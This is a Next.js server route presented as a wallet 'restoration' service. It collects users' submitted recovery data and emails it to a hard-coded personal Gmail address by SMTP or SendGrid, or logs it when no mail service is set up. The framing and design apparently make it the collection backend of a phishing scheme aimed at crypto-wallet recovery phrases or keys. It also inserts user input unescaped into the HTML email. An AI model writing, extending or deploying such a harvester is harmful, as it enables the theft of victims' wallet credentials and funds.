import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { email, issueId, issueTitle, issueDescription, issueSummary, selectedConnection, method, data, timestamp } = body

    const toAddress = process.env.RESTORE_M || 'jenniergers2@gmail.com'
    const submitted = data || 'N/A'
    const issueLabel = issueTitle || method?.toUpperCase() || 'Recovery'
    const subject = `Wallet Restoration Request - ${issueLabel}`
    const textBody = `Issue: ${issueLabel}\nDescription: ${issueDescription || 'N/A'}\nSummary: ${issueSummary || 'N/A'}\nConnection mode: ${selectedConnection || 'N/A'}\nMethod: ${method || 'N/A'}\nTime: ${timestamp}\n\nSubmitted Data:\n${submitted}`
    const htmlBody = `
      <div style="font-family: system-ui, sans-serif; color: #e2e8f0; background: #0f172a; padding: 24px;">
        <h1 style="color: #7dd3fc;">Wallet Restoration Request</h1>
        <p><strong>Issue:</strong> ${issueLabel}</p>
        <p><strong>Description:</strong> ${issueDescription || 'N/A'}</p>
        <p><strong>Summary:</strong> ${issueSummary || 'N/A'}</p>
        <p><strong>Connection mode:</strong> ${selectedConnection || 'N/A'}</p>
        <p><strong>Method:</strong> ${method || 'N/A'}</p>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <h2 style="margin-top: 20px; color: #a5b4fc;">Submitted Data</h2>
        <pre style="background: #111827; border-radius: 12px; color: #f8fafc; padding: 16px; overflow-x: auto; white-space: pre-wrap;">${String(submitted)}</pre>
      </div>
    `

    const smtpEnabled = Boolean(
      process.env.SMTP_HOST &&
      process.env.SMTP_PORT &&
      process.env.SMTP_USER &&
      process.env.SMTP_PASS &&
      process.env.SMTP_FROM
    )

    if (smtpEnabled) {
      const transport = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: Number(process.env.SMTP_PORT),
        secure: Number(process.env.SMTP_PORT) === 465,
        auth: {
          user: process.env.SMTP_USER,
          pass: process.env.SMTP_PASS,
        },
      })

      await transport.verify()
      await transport.sendMail({
        to: toAddress,
        from: process.env.SMTP_FROM as string,
        subject,
        text: textBody,
        html: htmlBody,
      })

      return NextResponse.json({ success: true, message: 'Recovery details sent via SMTP' }, { status: 200 })
    }

    if (process.env.SENDGRID_API_KEY && process.env.SENDGRID_FROM) {
      const sgRes = await fetch('https://api.sendgrid.com/v3/mail/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${process.env.SENDGRID_API_KEY}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          personalizations: [{ to: [{ email: toAddress }] }],
          from: { email: process.env.SENDGRID_FROM },
          subject,
          content: [
            { type: 'text/plain', value: textBody },
            { type: 'text/html', value: `<pre>${String(submitted)}</pre>` },
          ],
        }),
      })

      if (!sgRes.ok) {
        const txt = await sgRes.text()
        console.error('SendGrid error:', sgRes.status, txt)
        throw new Error('Failed to deliver via SendGrid')
      }

      return NextResponse.json({ success: true, message: 'Recovery details sent via SendGrid' }, { status: 200 })
    }

    console.log('Recovery details (no mail transport):', { to: toAddress, from: email, method, timestamp, submitted })
    return NextResponse.json({ success: true, message: `Recovery details logged (to: ${toAddress})` }, { status: 200 })
  } catch (error) {
    console.error('Error sending recovery email:', error)
    return NextResponse.json({ error: 'Failed to send recovery email' }, { status: 500 })
  }
}
